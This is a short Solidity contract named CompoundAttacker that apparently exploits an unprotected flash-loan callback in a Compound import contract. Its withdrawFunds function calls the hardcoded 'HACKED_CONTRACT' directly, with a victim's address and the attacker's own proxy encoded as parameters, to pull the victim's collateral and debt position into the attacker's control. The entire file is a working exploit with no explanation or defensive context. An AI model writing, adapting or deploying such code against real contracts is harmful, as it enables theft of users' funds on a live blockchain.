pragma solidity ^0.6.0;

abstract contract CompoundImportFlasLoan {
    function executeOperation(
        address _reserve,
        uint256 _amount,
        uint256 _fee,
        bytes calldata _params)
    external virtual;
}

contract CompoundAttacker {
    
    address public constant HACKED_CONTRACT = 0x0a9238e14d5A20CDb03811B12D1984587C3CE9a0;
    
    address public constant OUR_PROXY = 0xe20AA1584Df34B8be8D544A9Ae15eB49807d5D93;
    
    function withdrawFunds(address _vicitm, address _tokenAddr, address _cCollateralToken, address _cBorrowToken) public {
        // address cCollateralToken,
        //     address cBorrowToken,
        //     address user,
        //     address proxy
        
        bytes memory paramData = abi.encode(_cCollateralToken, _cBorrowToken, _vicitm, OUR_PROXY);
        
        CompoundImportFlasLoan(HACKED_CONTRACT).executeOperation(
            _tokenAddr,
            0,
            0,
            paramData
        );
    }
}